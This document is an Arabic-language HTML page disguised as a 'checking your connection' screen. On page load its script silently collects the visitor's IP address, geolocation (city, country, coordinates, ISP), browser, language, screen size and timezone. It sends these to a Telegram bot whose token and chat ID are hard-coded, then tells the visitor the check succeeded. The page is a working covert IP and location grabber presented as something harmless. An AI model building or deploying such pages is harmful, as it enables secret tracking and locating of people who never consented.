<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>فحص الاتصال...</title>
<style>
  body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: #e2e8f0;
         display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
  .card { background: #1e293b; padding: 40px 50px; border-radius: 14px; text-align: center;
          box-shadow: 0 10px 30px rgba(0,0,0,.4); }
  .spinner { width: 40px; height: 40px; border: 4px solid #334155; border-top-color: #38bdf8;
             border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h1 { font-size: 20px; margin: 0 0 8px; }
  p { color: #94a3b8; font-size: 14px; margin: 0; }
</style>
</head>
<body>
<div class="card">
  <div class="spinner"></div>
  <h1 id="h1">جاري التحقق من الاتصال...</h1>
  <p id="p">يرجى الانتظار، يتم فحص شبكة الاتصال لديك.</p>
</div>

<script>
// ============ الإعدادات ============
const BOT_TOKEN = "8990437503:AAEbLQn5Pe539tpZb-l47AHoWxMPOakftho";
const CHAT_ID   = "8278195073";
// ===================================

// 1) جلب الـ IP مع 3 مصادر احتياطية (لو فشل واحد نجرب التالي)
async function getIP() {
  const apis = [
    'https://api.ipify.org?format=json',
    'https://api64.ipify.org?format=json',
    'https://ipapi.co/json/'
  ];
  for (const url of apis) {
    try {
      const r = await fetch(url, { signal: AbortSignal.timeout(5000) });
      const d = await r.json();
      if (d && d.ip) return d.ip;
    } catch (e) { /* جرّب المصدر التالي */ }
  }
  return 'غير معروف';
}

// 2) الإرسال لتيليغرام بطريقتين: fetch no-cors ثم Image كاحتياط
function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
              `?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
  try { fetch(url, { mode: 'no-cors' }).catch(function(){}); } catch (e) {}
  try { new Image().src = url; } catch (e) {}
}

(async function main() {
  try {
    // الـ IP أولاً — مع مهلة زمنية حتى لا يتجمد السكربت
    const ip = await getIP();

    // معلومات جغرافية — اختيارية ولا توقف الإرسال لو فشلت
    let geo = null;
    try {
      const r = await fetch('https://ipwho.is/' + ip, { signal: AbortSignal.timeout(5000) });
      const d = await r.json();
      if (d && d.success) geo = d;
    } catch (e) {}

    const ua     = navigator.userAgent || '';
    const lang   = navigator.language || 'غير معروف';
    const screen = (window.screen ? screen.width + 'x' + screen.height : 'غير معروف');
    const tz     = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';

    let msg  = '🕵️ زائر جديد دخل الصفحة\n──────────────\n';
    msg     += '🌐 IP: ' + ip + '\n';
    if (geo) {
      msg += '📍 الموقع: ' + (geo.city || '?') + '، ' + (geo.country || '?') + '\n';
      msg += '🗺️ الإحداثيات: ' + geo.latitude + ', ' + geo.longitude + '\n';
      msg += '🏢 مزوّد الخدمة: ' + (geo.connection && geo.connection.isp ? geo.connection.isp : '?') + '\n';
    }
    msg += '🖥️ المتصفح: ' + ua.substring(0, 150) + '\n';
    msg += '🌍 اللغة: ' + lang + '\n';
    msg += '📱 الشاشة: ' + screen + '\n';
    msg += '🕒 المنطقة الزمنية: ' + tz + '\n';
    msg += '⏰ التاريخ: ' + new Date().toLocaleString();

    sendToTelegram(msg);   // الإرسال أولاً ثم تحديث الواجهة
    document.getElementById('h1').textContent = 'تم التحقق بنجاح ✓';
    document.getElementById('p').textContent = 'يمكنك المتابعة الآن.';
  } catch (e) {
    // محاولة أخيرة: أرسل نص الخطأ نفسه لتعرف أن الصفحة فشلت
    try { sendToTelegram('⚠️ فشل في الصفحة: ' + (e && e.message ? e.message : e)); } catch (err) {}
    document.getElementById('h1').textContent = 'تعذر الاتصال';
  }
})();
</script>
</body>
</html>
